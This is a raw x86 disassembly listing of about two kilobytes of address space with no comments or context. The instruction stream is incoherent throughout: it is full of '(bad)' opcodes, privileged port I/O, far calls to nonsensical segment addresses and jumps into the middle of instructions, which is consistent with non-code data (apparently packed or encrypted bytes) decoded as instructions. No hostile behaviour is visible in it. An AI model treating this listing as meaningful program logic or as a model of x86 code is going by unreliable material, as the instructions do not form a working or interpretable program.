  413d4d:	rcl    DWORD PTR [ebx+0x29ec358e],1
  413d53:	mov    ss,WORD PTR [ebx+0x4aa7a0e1]
  413d59:	dec    edi
  413d5a:	mov    ds:0x28a136a7,al
  413d5f:	push   0x5169488a
  413d64:	cmp    DWORD PTR [eax],esp
  413d66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d67:	inc    esi
  413d68:	scas   al,BYTE PTR es:[edi]
  413d69:	mov    dh,BYTE PTR [edx+0x568a8570]
  413d6f:	neg    DWORD PTR [ebp+0x76b96ebb]
  413d75:	push   0x84752427
  413d7a:	scas   eax,DWORD PTR es:[edi]
  413d7b:	jecxz  0x413cfd
  413d7d:	sbb    ah,cl
  413d7f:	iret   
  413d80:	and    DWORD PTR [ebp-0x1f],0xffffffde
  413d84:	adc    al,0x29
  413d86:	pop    eax
  413d87:	xor    BYTE PTR [ecx+0x57695e2a],ah
  413d8d:	xor    BYTE PTR [ecx+edi*2],ah
  413d90:	dec    edx
  413d91:	xor    al,0xce
  413d93:	aaa    
  413d94:	imul   esi,DWORD PTR gs:[esi-0xdd68256],0xffffffbc
  413d9c:	xchg   ecx,eax
  413d9d:	loop   0x413dd9
  413d9f:	fsub   st,st(6)
  413da1:	sbb    eax,0x1f66fb2c
  413da6:	imul   edi,DWORD PTR [ebx+0xb],0xffffffa3
  413daa:	loope  0x413d38
  413dac:	jb     0x413d39
  413dae:	rcl    BYTE PTR [esi],cl
  413db0:	call   0x233fd788
  413db5:	clc    
  413db6:	dec    eax
  413db7:	jmp    0xcb1497b4
  413dbc:	cli    
  413dbd:	out    dx,eax
  413dbe:	(bad)  
  413dc0:	adc    BYTE PTR [edx+0x7],bh
  413dc3:	sub    al,0x64
  413dc5:	and    BYTE PTR gs:[edi+edi*2+0x680ded33],ah
  413dcd:	adc    esp,DWORD PTR [ebx]
  413dcf:	or     BYTE PTR [edx],0xea
  413dd2:	nop
  413dd3:	pusha  
  413dd4:	xor    ebx,DWORD PTR [ecx*1+0x3e05e5ef]
  413ddb:	imul   esi,eax,0xffffffcd
  413dde:	out    dx,eax
  413ddf:	xchg   edx,eax
  413de0:	rol    BYTE PTR [eax+0x3717f24b],0xd7
  413de7:	clc    
  413de8:	(bad)  
  413de9:	push   ds
  413dea:	jmp    0x3226:0x4be4d9b1
  413df1:	xor    al,0xbf
  413df3:	enter  0xe1a0,0x88
  413df7:	rcl    BYTE PTR [edi-0x7f],0x6a
  413dfb:	aad    0x46
  413dfd:	mov    eax,0xd4fe598a
  413e02:	push   ebp
  413e03:	push   cs
  413e04:	imul   ecx,edx,0x32412cc4
  413e0a:	mov    WORD PTR [ecx],ds
  413e0c:	xor    DWORD PTR [ebx+0x2761a210],0x3d
  413e13:	scas   al,BYTE PTR es:[edi]
  413e14:	lds    ebx,FWORD PTR [eax+0x3ff7dad4]
  413e1a:	mov    ecx,DWORD PTR [edx-0x7de2d6b5]
  413e20:	cwde   
  413e21:	and    BYTE PTR [esi+ebp*8],ch
  413e24:	lahf   
  413e25:	lods   eax,DWORD PTR ds:[esi]
  413e26:	addr16 sbb esp,eax
  413e29:	int    0x8e
  413e2b:	jae    0x413e69
  413e2d:	rcr    BYTE PTR [ecx-0x3b],0x21
  413e31:	je     0x413e36
  413e33:	sti    
  413e34:	xor    al,0x71
  413e36:	xor    DWORD PTR [esi-0x7528c5c0],ecx
  413e3c:	or     al,0xaa
  413e3e:	add    eax,DWORD PTR [ebx-0x79]
  413e41:	adc    BYTE PTR [edx-0x2d5e46af],ah
  413e47:	pop    eax
  413e48:	scas   al,BYTE PTR es:[edi]
  413e49:	inc    esp
  413e4a:	mov    al,0x1f
  413e4c:	(bad)  
  413e4d:	adc    ah,BYTE PTR [eax+0x5d704cdf]
  413e53:	pop    esi
  413e54:	ins    DWORD PTR es:[edi],dx
  413e55:	or     eax,0x2ee030eb
  413e5a:	loopne 0x413e6a
  413e5c:	popa   
  413e5d:	fld    TBYTE PTR ds:0x3e1729c4
  413e63:	dec    edx
  413e64:	loopne 0x413e57
  413e66:	sub    DWORD PTR [ebp-0x431953a7],ebx
  413e6c:	jnp    0x413e2e
  413e6e:	(bad)  
  413e6f:	aam    0x11
  413e71:	ret    
  413e72:	retf   0x2832
  413e75:	aam    0x8c
  413e77:	mov    esi,0x196ceee8
  413e7c:	push   eax
  413e7d:	pop    ecx
  413e7e:	or     eax,edi
  413e80:	dec    eax
  413e81:	pop    esi
  413e82:	bound  edx,QWORD PTR [esi]
  413e84:	shl    DWORD PTR [ecx+ebp*8-0x54],0x9
  413e89:	fidivr DWORD PTR [ebx+ebx*8-0x3447daef]
  413e90:	sbb    eax,0xd20fa920
  413e95:	mov    al,0x79
  413e97:	inc    esi
  413e98:	xlat   BYTE PTR ds:[ebx]
  413e99:	dec    ebp
  413e9a:	cmp    edi,esp
  413e9c:	inc    eax
  413e9d:	sub    al,0xae
  413e9f:	jp     0x413eb4
  413ea1:	or     ah,BYTE PTR [edi+ebp*2-0x6a8a1aca]
  413ea8:	and    al,0xd5
  413eaa:	push   esp
  413eab:	das    
  413eac:	outs   dx,BYTE PTR ds:[esi]
  413ead:	aaa    
  413eae:	inc    esp
  413eaf:	jp     0x413e93
  413eb1:	push   ebx
  413eb2:	sbb    ecx,DWORD PTR [eax]
  413eb4:	add    al,al
  413eb6:	lods   al,BYTE PTR ds:[esi]
  413eb7:	cli    
  413eb8:	xor    DWORD PTR [esi-0x1cdc2aee],ecx
  413ebe:	repz pusha 
  413ec0:	fwait
  413ec1:	out    dx,al
  413ec2:	jmp    0x413eeb
  413ec4:	and    eax,0x68299bef
  413ec9:	jno    0x413ed1
  413ecb:	sbb    dh,bh
  413ecd:	push   0x6
  413ecf:	iret   
  413ed0:	mov    BYTE PTR [ecx-0x2bc0522a],ch
  413ed6:	mov    ecx,0x3315898f
  413edb:	fs mov bh,0xaa
  413ede:	xor    bl,BYTE PTR [edi+0x26a731f5]
  413ee4:	div    BYTE PTR ss:[ebx-0x4d]
  413ee8:	inc    ecx
  413ee9:	mov    edi,0x22992ac5
  413eee:	jge    0x413e7b
  413ef0:	xor    al,0x0
  413ef2:	push   cs
  413ef3:	xor    dh,cl
  413ef5:	fadd   st(1),st
  413ef7:	call   0xa793:0x24ea3f0b
  413efe:	jno    0x413f3c
  413f00:	push   ebx
  413f01:	lods   al,BYTE PTR ds:[esi]
  413f02:	pop    ss
  413f03:	out    dx,al
  413f04:	inc    ecx
  413f05:	push   edx
  413f06:	or     bh,dl
  413f08:	add    al,0x7b
  413f0a:	xor    ch,BYTE PTR ds:0xe957b3a7
  413f10:	xor    ecx,DWORD PTR [edi]
  413f12:	sbb    esp,DWORD PTR [eax+0x6]
  413f15:	adc    eax,0xf98b5d47
  413f1a:	push   es
  413f1b:	jno    0x413ebf
  413f1d:	jmp    0x413ef2
  413f1f:	pop    ebp
  413f20:	mov    ecx,0x1a092add
  413f25:	mov    ds:0xa65dd6f3,al
  413f2a:	ret    
  413f2b:	scas   eax,DWORD PTR es:[edi]
  413f2c:	clc    
  413f2d:	ret    
  413f2e:	adc    al,0xe3
  413f30:	inc    ebp
  413f31:	xchg   edi,eax
  413f32:	mov    al,0x3a
  413f34:	cmc    
  413f35:	arpl   sp,sp
  413f37:	inc    ebx
  413f38:	xchg   edx,eax
  413f39:	mov    ebp,0x2f7a7400
  413f3e:	outs   dx,BYTE PTR ds:[esi]
  413f3f:	dec    ebx
  413f40:	and    DWORD PTR [ebp+eiz*4+0x15c246a],eax
  413f47:	ins    BYTE PTR es:[edi],dx
  413f48:	adc    DWORD PTR [ebp*1-0x1b998471],ebp
  413f4f:	mov    edi,0x240cdd19
  413f54:	mov    esi,0xb375a445
  413f59:	jmp    0x413f5d
  413f5b:	shl    BYTE PTR [ebp-0x2b],0x74
  413f5f:	adc    cl,BYTE PTR [edx]
  413f61:	dec    esi
  413f62:	(bad)  
  413f63:	(bad)  
  413f64:	lds    ecx,FWORD PTR [esi-0x5a60640c]
  413f6a:	mov    eax,0xad9943ec
  413f6f:	adc    BYTE PTR [esi+edi*2+0x10],bl
  413f73:	xchg   ebx,eax
  413f74:	inc    esi
  413f75:	out    dx,eax
  413f76:	mov    ds:0xce27c467,al
  413f7b:	mov    DWORD PTR [ebx],edx
  413f7d:	cmp    DWORD PTR [edi],eax
  413f7f:	scas   al,BYTE PTR es:[edi]
  413f80:	je     0x413f4e
  413f82:	push   esi
  413f83:	cli    
  413f84:	fucomi st,st(1)
  413f86:	ficomp WORD PTR [ecx+0x27]
  413f89:	xor    ch,BYTE PTR [edi]
  413f8b:	in     eax,0x94
  413f8d:	(bad)  
  413f8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f8f:	outs   dx,DWORD PTR ds:[esi]
  413f90:	push   eax
  413f91:	fwait
  413f92:	xor    eax,0x8e876923
  413f97:	cmc    
  413f98:	sub    al,0x63
  413f9a:	lahf   
  413f9b:	xchg   esp,eax
  413f9c:	jmp    0x632a:0x3209cb75
  413fa3:	(bad)  
  413fa4:	mov    eax,0x77a485ee
  413fa9:	repz jge 0x413fed
  413fac:	push   es
  413fad:	inc    esp
  413fae:	rcl    ebp,cl
  413fb0:	pop    ss
  413fb1:	xchg   BYTE PTR [esi],bl
  413fb3:	ror    BYTE PTR [edx+0x187473d5],cl
  413fb9:	iret   
  413fba:	pop    ebp
  413fbb:	fld    QWORD PTR ds:0xcb258610
  413fc1:	mov    ch,al
  413fc3:	or     cl,BYTE PTR [esp+edx*8-0xedd8528]
  413fca:	push   ss
  413fcb:	or     ebp,DWORD PTR [edx]
  413fcd:	aad    0x5e
  413fcf:	out    dx,eax
  413fd0:	jnp    0x41404d
  413fd2:	call   0xc465:0x4615c9c2
  413fd9:	(bad)  
  413fda:	addr16 dec edx
  413fdc:	aad    0xc2
  413fde:	cmp    ebx,DWORD PTR [edx]
  413fe0:	arpl   WORD PTR [edx],si
  413fe2:	sbb    ecx,esi
  413fe4:	sahf   
  413fe5:	cmp    bl,BYTE PTR ds:0x858863
  413feb:	dec    esp
  413fec:	or     bh,dl
  413fee:	xchg   esp,eax
  413fef:	and    ebp,ebx
  413ff1:	addr16 xchg esi,eax
  413ff3:	je     0x414014
  413ff5:	mov    al,ds:0xcea404f1
  413ffa:	or     edi,DWORD PTR [esi]
  413ffc:	bound  eax,QWORD PTR [edi+0x6f874aae]
  414002:	dec    esi
  414003:	push   ecx
  414004:	adc    BYTE PTR gs:[ecx+0x599b18f9],0x5e
  41400c:	(bad)  
  41400d:	call   0x5d96aba
  414012:	or     al,0xb9
  414014:	ja     0x414054
  414016:	out    0x20,eax
  414018:	sub    al,0x3c
  41401a:	cmp    edx,esi
  41401c:	add    ch,dh
  41401e:	mov    cs,WORD PTR [ebp-0x37795509]
  414024:	push   eax
  414025:	xchg   esp,eax
  414026:	mov    ecx,0x759244a3
  41402b:	cmp    BYTE PTR [ebp-0x49d36416],al
  414031:	dec    esi
  414032:	fnsave [edx+0x1c3e231b]
  414038:	test   eax,0x5565c073
  41403d:	cmp    al,0x82
  41403f:	pop    esp
  414040:	xchg   ebx,eax
  414041:	or     eax,0xe965e1ed
  414046:	or     esi,DWORD PTR [ecx-0x479bdc3e]
  41404c:	sbb    bl,cl
  41404e:	sbb    dl,cl
  414050:	loop   0x413ff3
  414052:	nop
  414053:	pop    esp
  414054:	xchg   DWORD PTR ds:0xc8ac7ff0,ecx
  41405a:	call   0x51f45827
  41405f:	into   
  414060:	pop    ecx
  414061:	jp     0x4140a5
  414063:	push   esp
  414064:	into   
  414065:	clc    
  414066:	js     0x4140c3
  414068:	add    DWORD PTR [eax],esi
  41406a:	stc    
  41406b:	xchg   edi,eax
  41406c:	or     BYTE PTR [edx+ebx*1],ch
  41406f:	pop    es
  414070:	test   BYTE PTR ds:0x171647c6,ah
  414076:	rcl    DWORD PTR [eax],1
  414078:	and    eax,ebx
  41407a:	pop    esi
  41407b:	addr16 mov ch,0x8
  41407e:	fadd   DWORD PTR [esi+0x47d76c0b]
  414084:	call   0xbeb3:0x4641b705
  41408b:	stos   DWORD PTR es:[edi],eax
  41408c:	aas    
  41408d:	xchg   DWORD PTR [esi-0x2f],ecx
  414090:	push   ebx
  414091:	sbb    eax,0x40f4b3f3
  414096:	or     cl,BYTE PTR [edx-0x2fcb3cf0]
  41409c:	repnz mov dl,0x4b
  41409f:	pop    esp
  4140a0:	sub    dl,BYTE PTR [ebx]
  4140a2:	leave  
  4140a3:	sbb    DWORD PTR [ebp-0x7],ebp
  4140a6:	pusha  
  4140a7:	push   ss
  4140a8:	mov    ah,0xf4
  4140aa:	pushf  
  4140ab:	gs loope 0x414073
  4140ae:	inc    eax
  4140af:	jnp    0x41409b
  4140b1:	aas    
  4140b2:	cld    
  4140b3:	shr    BYTE PTR [ecx],0x6
  4140b6:	sbb    DWORD PTR [ecx+0x57],eax
  4140b9:	xchg   esi,eax
  4140ba:	mov    DWORD PTR [eax],eax
  4140bc:	in     al,dx
  4140bd:	or     DWORD PTR [esi],edi
  4140bf:	jle    0x414060
  4140c1:	jo     0x414065
  4140c3:	jo     0x414053
  4140c5:	add    BYTE PTR [edx+eax*2-0x7d],ch
  4140c9:	bound  ebp,QWORD PTR [ebp+0x16a3cd00]
  4140cf:	and    eax,0x3e99f62d
  4140d4:	dec    eax
  4140d5:	bound  ebx,QWORD PTR [ebp+0x73c03163]
  4140db:	sbb    dl,BYTE PTR [edi]
  4140dd:	inc    ebx
  4140de:	inc    edi
  4140df:	cs leave 
  4140e1:	daa    
  4140e2:	jl     0x414156
  4140e4:	adc    ecx,edx
  4140e6:	xchg   DWORD PTR [ebp-0x57],edi
  4140e9:	sub    eax,0x829778bc
  4140ee:	es stos DWORD PTR es:[edi],eax
  4140f0:	xlat   BYTE PTR ds:[ebx]
  4140f1:	xor    eax,0x31df8d48
  4140f6:	scas   al,BYTE PTR es:[edi]
  4140f7:	popf   
  4140f8:	and    bl,BYTE PTR [ebx+0x58]
  4140fb:	pop    esp
  4140fc:	mov    ah,BYTE PTR [esi-0xa]
  4140ff:	test   DWORD PTR [ebp-0x69d3929f],esi
  414105:	sub    eax,DWORD PTR [eax-0x5]
  414108:	gs add eax,0x9fb8084f
  41410e:	ds push eax
  414110:	pop    es
  414111:	lock aas 
  414113:	int3   
  414114:	jb     0x4140a6
  414116:	fs loop 0x414186
  414119:	fdivr  DWORD PTR [esi-0x24]
  41411c:	pushf  
  41411d:	or     ch,bh
  41411f:	lea    ecx,[esi+eax*4]
  414122:	push   edx
  414123:	pop    ss
  414124:	lea    esi,[esp+edx*1-0x24]
  414128:	xchg   edx,eax
  414129:	push   edi
  41412a:	add    cl,BYTE PTR [ecx]
  41412c:	inc    DWORD PTR [edx+0x7c550a1e]
  414132:	mov    eax,DWORD PTR [eax+edx*8-0x40]
  414136:	push   ds
  414137:	rol    BYTE PTR [edx],cl
  414139:	sbb    al,BYTE PTR [esp+esi*8]
  41413c:	lock aas 
  41413e:	loop   0x414104
  414140:	fisub  DWORD PTR [ebx+0x30]
  414143:	sub    eax,0x7abca73f
  414148:	adc    BYTE PTR [esi+esi*4],bh
  41414b:	mov    eax,ds:0x3f7c681c
  414150:	sbb    al,0x54
  414152:	scas   eax,DWORD PTR es:[edi]
  414153:	cdq    
  414154:	std    
  414155:	mov    bh,al
  414157:	aas    
  414158:	test   al,0xc9
  41415a:	(bad)  
  41415b:	xor    DWORD PTR [ebp+ecx*1-0x1e],esp
  41415f:	fucomip st,st(6)
  414161:	fisubr DWORD PTR ss:[eax-0x7a86638e]
  414168:	xchg   ecx,eax
  414169:	cmp    BYTE PTR [edi+0x3b],dl
  41416c:	ss mov bl,0x76
  41416f:	scas   al,BYTE PTR es:[edi]
  414170:	mov    dl,0x62
  414172:	shr    BYTE PTR [ebx-0x3365ef13],0x83
  414179:	fld    QWORD PTR [ecx+0x34]
  41417c:	inc    ebx
  41417d:	lock and al,0x4b
  414180:	fs iret 
  414182:	adc    eax,0x1320943b
  414187:	sar    BYTE PTR [ebx],0xa7
  41418a:	jg     0x41411d
  41418c:	dec    ebp
  41418d:	das    
  41418e:	and    eax,0xc6d9d418
  414193:	push   eax
  414194:	lods   al,BYTE PTR ds:[esi]
  414195:	shr    DWORD PTR [esp+eiz*2+0x76bdf91d],cl
  41419c:	lock loop 0x41413b
  41419f:	pop    esp
  4141a0:	push   ecx
  4141a1:	push   DWORD PTR [eax+0x4a]
  4141a4:	loop   0x4141b7
  4141a6:	popf   
  4141a7:	fidiv  DWORD PTR [edi-0x2e]
  4141aa:	or     BYTE PTR [ebx],ah
  4141ac:	sbb    al,0x7d
  4141ae:	mov    ecx,0xebecd4c4
  4141b3:	or     esi,DWORD PTR [edi+0x1d]
  4141b6:	call   0xd237:0x197e4938
  4141bd:	xor    BYTE PTR [edi],dh
  4141bf:	stos   BYTE PTR es:[edi],al
  4141c0:	icebp  
  4141c1:	fstp   st(0)
  4141c3:	stos   DWORD PTR es:[edi],eax
  4141c4:	adc    DWORD PTR [ecx],0xe1882f99
  4141ca:	stos   BYTE PTR es:[edi],al
  4141cb:	jne    0x414172
  4141cd:	push   0x111a000c
  4141d2:	mov    ds:0x29355746,al
  4141d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141d8:	sbb    ebp,DWORD PTR [esi-0x58]
  4141db:	loop   0x414173
  4141dd:	(bad)  [edi-0x56]
  4141e0:	pop    eax
  4141e1:	arpl   WORD PTR [ecx-0x1715bc7c],cx
  4141e7:	xor    DWORD PTR [ecx],esi
  4141e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141ea:	inc    eax
  4141eb:	in     eax,dx
  4141ec:	retf   
  4141ed:	fidiv  DWORD PTR [edi]
  4141ef:	out    0xe8,eax
  4141f1:	xor    BYTE PTR [edx+eax*4-0x21],bl
  4141f5:	push   0x22
  4141f7:	xchg   esi,eax
  4141f8:	sahf   
  4141f9:	inc    esi
  4141fa:	xor    esp,DWORD PTR [ecx+0x3a]
  4141fd:	div    BYTE PTR [esp+ebx*8+0x60479dc1]
  414204:	dec    esi
  414205:	inc    ecx
  414206:	ins    DWORD PTR es:[edi],dx
  414207:	xchg   ebp,eax
  414208:	out    dx,al
  414209:	lds    edx,FWORD PTR [ecx+0x62d74aef]
  41420f:	setns  ah
  414212:	sldt   WORD PTR [ebx+0x3b]
  414216:	shr    DWORD PTR [eax+0x78],cl
  414219:	cdq    
  41421a:	sbb    ah,dh
  41421c:	adc    al,BYTE PTR [edi]
  41421e:	jb     0x414251
  414220:	out    0xc7,al
  414222:	jae    0x3b45d6b
  414228:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414229:	dec    esi
  41422a:	(bad)  
  41422b:	out    0xbd,eax
  41422d:	add    edx,esi
  41422f:	fadd   DWORD PTR [ebx-0x67c2a969]
  414235:	pushf  
  414236:	jmp    0x414207
  414238:	out    dx,eax
  414239:	out    0x7b,eax
  41423b:	jb     0x41420c
  41423d:	mov    eax,0x51b3a97e
  414242:	shl    BYTE PTR [edx+eax*4+0x556fdcfc],cl
  414249:	mov    dh,0xfa
  41424b:	fmul   st,st(7)
  41424d:	xor    eax,DWORD PTR [eax-0x66]
  414250:	xchg   esi,eax
  414251:	add    BYTE PTR [ebx+esi*2],0xfc
  414255:	sar    BYTE PTR [ebp-0x63],cl
  414258:	push   esp
  414259:	popf   
  41425a:	(bad)  
  41425b:	fcmovnu st,st(4)
  41425d:	pop    ds
  41425e:	cmp    ebp,ebx
  414260:	cmp    BYTE PTR ds:0xf50dc863,0xc6
  414267:	pop    eax
  414268:	cld    
  414269:	jns    0x4142dd
  41426b:	mov    dl,BYTE PTR [ebx]
  41426d:	adc    cl,dl
  41426f:	mov    dl,0x3f
  414271:	repz std 
  414273:	inc    eax
  414274:	mov    ds,WORD PTR [ebp-0x48]
  414277:	test   DWORD PTR [ebx+0x33],ebp
  41427a:	js     0x41420b
  41427c:	xchg   edi,eax
  41427d:	sub    eax,0x6aad2e00
  414282:	xor    eax,0x4adac48d
  414287:	in     al,dx
  414288:	xor    bl,ah
  41428a:	push   edi
  41428b:	hlt    
  41428c:	aaa    
  41428d:	adc    al,BYTE PTR [esi-0x4053ce57]
  414293:	jecxz  0x414256
  414295:	repnz cs cwde 
  414298:	stc    
  414299:	pusha  
  41429a:	clc    
  41429b:	out    0x3a,eax
  41429d:	stos   DWORD PTR es:[edi],eax
  41429e:	fcmove st,st(7)
  4142a0:	jne    0x414228
  4142a2:	in     al,dx
  4142a3:	in     eax,0xa0
  4142a5:	cmp    BYTE PTR [ecx-0x28],bh
  4142a8:	cwde   
  4142a9:	push   ss
  4142aa:	jae    0x41425c
  4142ac:	or     eax,0xc153137f
  4142b1:	popf   
  4142b2:	dec    BYTE PTR [ecx-0x10]
  4142b5:	shl    cl,cl
  4142b7:	pop    edi
  4142b8:	inc    edx
  4142b9:	jae    0x41432c
  4142bb:	call   0x5504:0x18ebbfc6
  4142c2:	xor    esi,DWORD PTR ds:0xf4e67d77
  4142c8:	mov    dh,0xc1
  4142ca:	call   0x81f:0x14c325e9
  4142d1:	test   BYTE PTR [eax-0x65],ch
  4142d4:	add    eax,0xa1839072
  4142d9:	push   eax
  4142da:	dec    ebp
  4142db:	push   ss
  4142dc:	aad    0xf2
  4142de:	adc    ah,BYTE PTR [ecx+0x6b]
  4142e1:	aad    0xa3
  4142e3:	sbb    eax,0x45b5578e
  4142e8:	dec    DWORD PTR [eax-0x4026ab08]
  4142ee:	mov    edx,0x8ea8de0e
  4142f3:	xchg   esp,eax
  4142f4:	mov    esp,0xda75ecc9
  4142f9:	push   ebp
  4142fa:	xor    DWORD PTR [esi+ecx*1],0x6d
  4142fe:	mov    al,al
  414300:	mov    edi,0xa5871b29
  414305:	xchg   ebp,eax
  414306:	cmp    DWORD PTR [ebx],0xc5913a84
  41430c:	inc    esp
  41430d:	add    al,0xb5
  41430f:	test   eax,0x1bd44779
  414314:	jmp    0x4142e0
  414316:	test   BYTE PTR [edi-0x24],cl
  414319:	mov    ah,0xf1
  41431b:	or     al,cl
  41431d:	sahf   
  41431e:	retf   0x3479
  414321:	and    dh,cl
  414323:	std    
  414324:	nop
  414325:	test   eax,0x31a05431
  41432a:	cmp    ch,BYTE PTR ds:0xb7c8c18d
  414330:	pop    edx
  414331:	pop    es
  414332:	dec    ebx
  414333:	pop    ecx
  414334:	sub    eax,0xffffffdd
  414337:	mov    ecx,0xa39cfd17
  41433c:	jmp    0x414320
  41433e:	mov    bh,BYTE PTR [ecx+0xc3345c9]
  414344:	xchg   esi,eax
  414345:	push   eax
  414346:	retf   
  414347:	call   0x151cee3c
  41434c:	test   eax,0x3db3076b
  414351:	lods   al,BYTE PTR ds:[esi]
  414352:	fidiv  DWORD PTR [ebp*8-0x7540095d]
  414359:	call   0xc115e072
  41435e:	or     ebx,DWORD PTR [esi-0x30b5e16c]
  414364:	(bad)  
  414365:	out    0xfb,al
  414367:	jle    0x4143e0
  414369:	inc    edi
  41436a:	jg     0x414329
  41436c:	lds    esi,FWORD PTR [ebp+0x51]
  41436f:	enter  0x5438,0x4d
  414373:	inc    edi
  414374:	push   ds
  414375:	addr16 fwait
  414377:	mov    edx,0xe6b7631d
  41437c:	mov    ds:0x6e19c0b6,al
  414381:	stc    
  414382:	mov    ds:0x9dabee81,eax
  414387:	pop    ds
  414388:	fcmovnb st,st(2)
  41438a:	test   DWORD PTR [edi-0x2c1051b],edx
  414390:	jnp    0x414371
  414392:	into   
  414393:	or     eax,0xc49817e1
  414398:	dec    ebx
  414399:	cdq    
  41439a:	adc    al,0x18
  41439c:	mov    eax,0xd5b959f9
  4143a1:	or     eax,0xd19cc8b
  4143a6:	mov    al,ds:0x573b3ccd
  4143ab:	das    
  4143ac:	mov    esp,DWORD PTR [eax+0x47b0fb31]
  4143b2:	pop    ds
  4143b3:	sbb    eax,0x1092fe66
  4143b8:	inc    ebp
  4143b9:	cmc    
  4143ba:	sbb    al,0x42
  4143bc:	pop    edi
  4143bd:	push   ecx
  4143be:	mov    eax,0x14cd9bc1
  4143c3:	lods   eax,DWORD PTR ds:[esi]
  4143c4:	mov    edi,0xccfe5f53
  4143c9:	call   DWORD PTR [edi-0xe]
  4143cc:	sahf   
  4143cd:	aam    0xea
  4143cf:	mov    ch,0xa
  4143d1:	xchg   esp,eax
  4143d2:	or     DWORD PTR [ebx+0x2b052b5a],edx
  4143d8:	inc    esp
  4143d9:	call   FWORD PTR [ebx+0x54ae0881]
  4143df:	enter  0x3c63,0x1d
  4143e3:	shl    BYTE PTR [edi-0x6b],0xde
  4143e7:	ficomp WORD PTR [ecx]
  4143e9:	test   eax,0xf7cc605a
  4143ee:	xchg   dh,al
  4143f0:	push   cs
  4143f1:	aas    
  4143f2:	pushf  
  4143f3:	mov    dl,0x4b
  4143f5:	adc    ah,BYTE PTR [edi-0x59b71f87]
  4143fb:	in     eax,dx
  4143fc:	lea    edx,[ecx+0x3a11704a]
  414402:	es push 0x77
  414405:	adc    al,0x75
  414407:	je     0x4143ae
  414409:	or     DWORD PTR [ecx+0x12221007],edi
  41440f:	ret    0xf871
  414412:	repnz (bad)
  414415:	repnz jmp 0x5363:0xb05f44a4
  41441d:	pop    ebp
  41441e:	mov    eax,ds:0xceec880e
  414423:	push   cs
  414424:	pop    ecx
  414425:	xor    eax,0x8197522a
  41442a:	dec    eax
  41442b:	jg     0x414421
  41442d:	push   ebp
  41442e:	not    DWORD PTR [ebx+0x6ce018e7]
  414434:	test   DWORD PTR [edi],0x4e3b92e7
  41443a:	call   0x2caf3d8a
  41443f:	dec    edx
  414440:	push   cs
  414441:	jne    0x414461
  414443:	push   esi
  414444:	xor    DWORD PTR [ecx],ecx
  414446:	xor    bl,BYTE PTR [ebp+0x65]
  414449:	push   edx
  41444a:	retf   
  41444b:	push   eax
  41444c:	loope  0x41440e
  41444e:	out    0xb4,al
  414450:	pop    es
  414451:	inc    edi
  414452:	cli    
  414453:	dec    ecx
  414454:	jecxz  0x41442a
  414456:	push   0xf4c3d9ed
  41445b:	sub    DWORD PTR ds:0xeb6474c5,edi
  414461:	pop    ecx
  414462:	inc    ecx
  414463:	jl     0x4143f4
  414465:	jns    0x4143ee
  414467:	arpl   WORD PTR [esi+0x6b],bp
  41446a:	cmp    al,0x5b
  41446c:	dec    ebp
  41446d:	add    esi,DWORD PTR [eax+0x198dbbae]
  414473:	xor    eax,0x7f081359
  414478:	repz fbstp TBYTE PTR [eax+0x841dd39]
  41447f:	outs   dx,DWORD PTR ds:[esi]
  414480:	mov    dh,0x3a
  414482:	clc    
  414483:	and    BYTE PTR [edi+0x56],dh
  414486:	mov    al,0xc2
  414488:	fucomp st(7)
  41448a:	or     DWORD PTR [esi],eax
  41448c:	fistp  DWORD PTR [eax]
  41448e:	jb     0x414477
  414490:	xor    BYTE PTR [ecx+edx*2],0x81
  414494:	lock mov ebx,0x3ff038c0
  41449a:	addr16 repz sub al,0xf1
  41449e:	add    bl,BYTE PTR [edi]
  4144a0:	ror    DWORD PTR [ebx-0x54],1
  4144a3:	push   edi
  4144a4:	jmp    0xe7f03653
  4144a9:	stc    
  4144aa:	push   ss
  4144ab:	sbb    eax,ebx
  4144ad:	call   0xb787:0x430894e0
  4144b4:	jl     0x4144ef
  4144b6:	mov    ch,0x53
  4144b8:	test   eax,0x1fc67624
  4144bd:	and    DWORD PTR [edx],0xffffffec
  4144c0:	inc    esp
  4144c1:	not    BYTE PTR [edx+0xb65d546]
  4144c7:	(bad)  
  4144c8:	cmp    ecx,edx
  4144ca:	in     eax,dx
  4144cb:	dec    edi
  4144cc:	test   BYTE PTR [ecx],cl
  4144ce:	dec    esi
  4144cf:	and    DWORD PTR [edx-0x71],ecx
  4144d2:	and    eax,0x6597250c
  4144d7:	das    
  4144d8:	and    al,0x4a
  4144da:	retf   0x5166
  4144dd:	jl     0x41446f
  4144df:	push   esi
  4144e0:	add    ecx,DWORD PTR [esp+ebp*4+0x7c]
  4144e4:	cmp    al,0xeb
  4144e7:	les    ecx,FWORD PTR [esp+eax*4]
  4144ea:	adc    cl,BYTE PTR [ebp-0x1c06b21a]
  4144f0:	out    dx,al
  4144f1:	jp     0x414497
  4144f3:	inc    ebx
  4144f4:	mov    ebp,DWORD PTR [edx]
  4144f6:	xchg   ecx,eax
  4144f7:	out    0x64,eax
  4144f9:	(bad)  
  4144fa:	iret   
  4144fb:	xchg   esi,eax
  4144fc:	mov    ecx,0xb990647
  414501:	bound  ebp,QWORD PTR [ecx]
  414503:	sbb    BYTE PTR [edx-0x3f895a7f],bl
  414509:	rol    eax,0xc2
  41450c:	push   ds
  41450d:	fadd   DWORD PTR [edi]
  41450f:	mov    ecx,0xe4557997
  414514:	jmp    0xa5e4249f
  414519:	ins    DWORD PTR es:[edi],dx
  41451a:	xor    cl,ch
  41451c:	cld    
  41451d:	sahf   
  41451e:	mov    al,0xd0
  414520:	inc    edi
  414521:	cdq    
  414522:	data16 sbb ah,BYTE PTR [ecx+0x388e2abd]
  414529:	jno    0x414595
  41452b:	ja     0x4145a4
  41452d:	cmp    eax,DWORD PTR [edx]
  41452f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414530:	push   ebp
  414531:	inc    ebp
  414532:	rol    BYTE PTR [esi-0x61bf9a87],1
  414538:	cld    
  414539:	or     BYTE PTR [edx],dh
  41453b:	mov    BYTE PTR [esi-0x627bd2c],0x6b
  414542:	sti    
  414543:	ins    DWORD PTR es:[edi],dx
  414544:	(bad)  
  414545:	addr16 mov ebx,0x20ca7bd0
  41454b:	push   edx
  41454c:	and    bl,BYTE PTR [ecx-0x54]
  41454f:	aas    
  414550:	xlat   BYTE PTR ds:[ebx]
  414551:	inc    eax
  414552:	test   dl,0x9d
  414555:	pop    esi
